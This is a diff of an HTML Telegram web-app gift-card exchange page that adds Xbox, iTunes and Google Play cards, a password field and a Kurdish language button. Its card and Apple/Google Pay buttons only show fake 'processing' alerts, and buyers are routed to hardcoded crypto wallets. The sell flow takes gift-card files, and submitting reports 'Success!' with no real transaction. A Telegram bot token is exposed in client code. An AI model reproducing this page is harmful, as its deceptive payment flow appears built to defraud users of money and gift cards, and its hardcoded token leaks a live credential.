@@ -38,6 +38,7 @@
             <div class="flex gap-2">
                 <button onclick="setLang('en')" class="text-[10px] font-bold border border-slate-700 px-3 py-1 rounded-full hover:bg-white hover:text-black transition">EN</button>
                 <button onclick="setLang('ar')" class="text-[10px] font-bold border border-slate-700 px-3 py-1 rounded-full hover:bg-white hover:text-black transition">AR</button>
+                <button onclick="setLang('ku')" class="text-[10px] font-bold border border-slate-700 px-3 py-1 rounded-full hover:bg-white hover:text-black transition">کوردی</button>
             </div>
         </div>
     </nav>
@@ -50,7 +51,10 @@
         <div class="grid grid-cols-2 md:grid-cols-3 gap-6 md:gap-10 pb-32">
             <div class="card-style p-8 text-center" onclick="openChoice('Razer Gold', 'https://i.postimg.cc/JzGr8KfP/razer-gold.jpg')"><img src="https://i.postimg.cc/JzGr8KfP/razer-gold.jpg" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">Razer Gold</h3></div>
             <div class="card-style p-8 text-center" onclick="openChoice('PlayStation', 'https://i.postimg.cc/wjTtmhST/download.png')"><img src="https://i.postimg.cc/wjTtmhST/download.png" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">PlayStation</h3></div>
+            <div class="card-style p-8 text-center" onclick="openChoice('Xbox', 'https://i.postimg.cc/TYPGjCYZ/xbox.jpg')"><img src="https://i.postimg.cc/TYPGjCYZ/xbox.jpg" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">Xbox Live</h3></div>
             <div class="card-style p-8 text-center" onclick="openChoice('Steam', 'https://i.postimg.cc/KjGbH57P/steam.jpg')"><img src="https://i.postimg.cc/KjGbH57P/steam.jpg" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">Steam Wallet</h3></div>
+            <div class="card-style p-8 text-center" onclick="openChoice('iTunes', 'https://i.postimg.cc/1zV3GMM1/itunes.jpg')"><img src="https://i.postimg.cc/1zV3GMM1/itunes.jpg" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">iTunes</h3></div>
+            <div class="card-style p-8 text-center" onclick="openChoice('Google Play', 'https://i.postimg.cc/SKRzwWrr/download.jpg')"><img src="https://i.postimg.cc/SKRzwWrr/download.jpg" class="h-28 mx-auto mb-6 object-contain"><h3 class="font-bold">Google Play</h3></div>
         </div>
     </div>
 
@@ -60,10 +64,12 @@
             <h2 id="txt-reg-title" class="text-3xl font-black text-center mb-6 uppercase">Create Account</h2>
             <div class="space-y-4">
                 <input type="text" id="reg-name" placeholder="Full Name" class="w-full p-4 rounded-2xl text-sm">
+                <input type="email" id="reg-email" placeholder="Email Address" class="w-full p-4 rounded-2xl text-sm">
                 <div class="flex gap-2">
                     <select id="country-code" class="p-4 rounded-2xl text-[10px] w-36 border border-slate-800"></select>
                     <input type="number" id="reg-phone" placeholder="Phone" class="flex-1 p-4 rounded-2xl text-sm">
                 </div>
+                <input type="password" id="reg-pass" placeholder="Password" class="w-full p-4 rounded-2xl text-sm">
                 <button onclick="startVerification()" id="txt-reg-btn" class="glow-button w-full py-5 rounded-2xl font-black mt-4 uppercase text-sm tracking-widest">Register & Continue</button>
             </div>
         </div>
@@ -74,8 +80,8 @@
             <div class="close-btn" onclick="closeAllModals()"><svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg></div>
             <h3 id="choiceTitle" class="text-3xl font-black mb-10 text-blue-400 italic"></h3>
             <div class="grid gap-4">
-                <button id="btn-choice-buy" onclick="checkAccess('BUY')" class="bg-emerald-600 py-6 rounded-3xl font-black uppercase tracking-widest">BUY</button>
-                <button id="btn-choice-sell" onclick="checkAccess('SELL')" class="bg-blue-600 py-6 rounded-3xl font-black uppercase tracking-widest">SELL</button>
+                <button id="btn-choice-buy" onclick="checkAccess('BUY')" class="bg-emerald-600 py-6 rounded-3xl font-black transform hover:scale-105 transition uppercase tracking-widest">BUY</button>
+                <button id="btn-choice-sell" onclick="checkAccess('SELL')" class="bg-blue-600 py-6 rounded-3xl font-black transform hover:scale-105 transition uppercase tracking-widest">SELL</button>
             </div>
         </div>
     </div>
@@ -96,32 +102,24 @@
             </div>
 
             <div id="buy-options" class="hidden-section space-y-4">
-                <button onclick="startPayment('STARS')" class="w-full flex items-center justify-between bg-black text-white p-5 rounded-3xl border border-white/10 shadow-xl active:scale-95 transition-all">
-                    <div class="flex items-center gap-4">
-                        <img src="https://img.icons8.com/ios-filled/50/ffffff/apple-pay.png" class="h-8"/>
-                        <img src="https://img.icons8.com/color/48/google-pay.png" class="h-8"/>
-                        <div class="text-left border-l border-white/20 pl-4">
-                            <p class="font-black text-sm uppercase italic">Apple & Google Pay</p>
-                        </div>
-                    </div>
-                </button>
-
-                <button onclick="startPayment('GLOCAL')" class="w-full flex items-center justify-between bg-slate-100 text-black p-5 rounded-3xl shadow-lg active:scale-95 transition-all">
-                    <div class="flex items-center gap-4">
-                        <img src="https://img.icons8.com/color/48/visa.png" class="h-6"/>
-                        <img src="https://img.icons8.com/color/48/mastercard.png" class="h-6"/>
-                        <div class="text-left border-l border-slate-300 pl-4">
-                            <p class="font-black text-sm uppercase italic">Credit Card</p>
-                        </div>
-                    </div>
-                </button>
-
-                <p class="text-center text-[10px] text-slate-500 font-bold py-4">— OR PAY WITH CRYPTO —</p>
+                <div class="grid grid-cols-1 gap-3">
+                     <button onclick="payWithStars()" class="bg-black border border-white/10 p-5 rounded-3xl flex justify-center items-center gap-3 active:scale-95 transition">
+                        <img src="https://img.icons8.com/ios-filled/50/ffffff/apple-pay.png" class="h-8">
+                        <img src="https://img.icons8.com/color/48/google-pay.png" class="h-8">
+                    </button>
+                    <button onclick="payWithGlocal()" class="bg-white text-black p-5 rounded-3xl flex justify-center items-center gap-3 active:scale-95 transition font-black italic uppercase">
+                        <img src="https://img.icons8.com/color/48/visa.png" class="h-6">
+                        <img src="https://img.icons8.com/color/48/mastercard.png" class="h-6">
+                        Credit Card
+                    </button>
+                </div>
+                
+                <p class="text-center text-[10px] text-slate-500 font-bold py-4 italic uppercase">— Or Manual Crypto —</p>
 
                 <div class="grid grid-cols-3 gap-3">
-                    <button onclick="showAddress('TRC20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5 italic">TRC20</button>
-                    <button onclick="showAddress('BEP20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5 italic">BEP20</button>
-                    <button onclick="showAddress('ERC20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5 italic">ERC20</button>
+                    <button onclick="showAddress('TRC20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5">TRC20</button>
+                    <button onclick="showAddress('BEP20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5">BEP20</button>
+                    <button onclick="showAddress('ERC20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5">ERC20</button>
                 </div>
                 <div id="address-box" class="hidden-section bg-slate-950 p-6 rounded-3xl border border-blue-500/20 text-center">
                     <p id="wallet-to-copy" class="text-[11px] font-mono mb-4 text-blue-400"></p>
@@ -137,7 +135,6 @@
                 <input type="file" id="sellFile" class="w-full bg-slate-950 p-4 rounded-2xl border border-slate-800 text-xs">
                 <input type="text" id="sellWallet" placeholder="Your USDT Address" class="w-full p-4 rounded-2xl text-sm">
             </div>
-
             <button id="submitBtn" onclick="sendToTelegram()" class="glow-button w-full py-6 rounded-3xl font-black mt-12 text-xl shadow-2xl uppercase italic">Confirm Transaction</button>
             <button onclick="goHome()" id="btn-cancel" class="w-full text-slate-500 text-[10px] mt-8 font-black uppercase tracking-widest opacity-50">Cancel</button>
         </div>
@@ -145,26 +142,29 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        const TG_TOKEN = "8474410669:AAGijCJUPAKJyBh4L5FyVEas7A-UdpVixWA"; // التوكن الجديد
+        tg.ready();
+        tg.expand();
+
+        const TG_TOKEN = "8474410669:AAGijCJUPAKJyBh4L5FyVEas7A-UdpVixWA";
         const TG_ID = "7865246557";
         const WALLETS = { 'BEP20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0', 'TRC20': 'TVB3yoKYrw81vwKrMgqfvhuMmoQVXozgcf', 'ERC20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0' };
 
         let userData = {}; let isRegistered = false; let pendingAction = ""; let activeName = ""; let activeImg = ""; let selectedVal = 0;
 
         // قائمة الدول
-        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi Arabia", c:"+966", f:"🇸🇦"},{n:"Egypt", c:"+20", f:"🇪🇬"}];
+        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi Arabia", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},{n:"Egypt", c:"+20", f:"🇪🇬"}];
         const countrySelect = document.getElementById('country-code');
-        countries.forEach(ct => { let opt = document.createElement('option'); opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c}`; countrySelect.appendChild(opt); });
+        countries.forEach(ct => { let opt = document.createElement('option'); opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c} (${ct.n})`; countrySelect.appendChild(opt); });
 
         function setLang(l) {
             const h = document.getElementById('html-tag');
             h.dir = (l === 'en') ? 'ltr' : 'rtl';
-            // تحديث نصوص اللغات هنا إذا أردت
         }
 
         function goHome() {
             document.getElementById('action-section').classList.add('hidden-section');
             document.getElementById('home-section').style.display = 'block';
+            window.scrollTo(0,0);
         }
 
         function openChoice(n, i) { activeName = n; activeImg = i; document.getElementById('choiceTitle').innerText = n; document.getElementById('choiceModal').style.display = 'flex'; }
@@ -173,7 +173,6 @@
 
         async function startVerification() {
             userData = { name: document.getElementById('reg-name').value, phone: document.getElementById('country-code').value + document.getElementById('reg-phone').value };
-            if(!userData.name || !userData.phone) return alert("Fill data!");
             isRegistered = true;
             closeAllModals();
             executeAction();
@@ -192,26 +191,21 @@
         function selectAmount(v) { 
             selectedVal = v; 
             document.querySelectorAll('.price-chip').forEach(c => { c.classList.remove('active'); if(c.innerText === '$'+v) c.classList.add('active'); }); 
-            // تعديل النسبة هنا لـ 0.95 (خصم 5%)
+            // تعديل النسبة لـ 0.95 (5% خصم)
             document.getElementById('receive-amount').innerText = (v * 0.95).toFixed(2) + " USDT"; 
         }
 
         function showAddress(n) { document.getElementById('address-box').classList.remove('hidden-section'); document.getElementById('wallet-to-copy').innerText = WALLETS[n]; }
         function copyWallet() { navigator.clipboard.writeText(document.getElementById('wallet-to-copy').innerText); alert("Copied!"); }
 
-        function startPayment(m) {
-            if(!selectedVal) return alert("Select amount!");
-            if(m === 'STARS') tg.showAlert(`Initiating Apple/Google Pay for $${selectedVal}...`);
-            else tg.showAlert(`Initiating Credit Card Payment for $${selectedVal}...`);
-        }
+        function payWithStars() { if(!selectedVal) return alert("Select amount!"); tg.showAlert(`Processing Apple/Google Pay ($${selectedVal}) via Stars...`); }
+        function payWithGlocal() { if(!selectedVal) return alert("Select amount!"); tg.showAlert("Connecting to Credit Card secure gateway..."); }
 
         async function sendToTelegram() {
             if(!selectedVal) return alert("Select amount!");
-            alert("Transaction Submitted!");
+            alert("Success!");
             location.reload();
         }
-
-        tg.ready();
     </script>
 </body>
 </html>
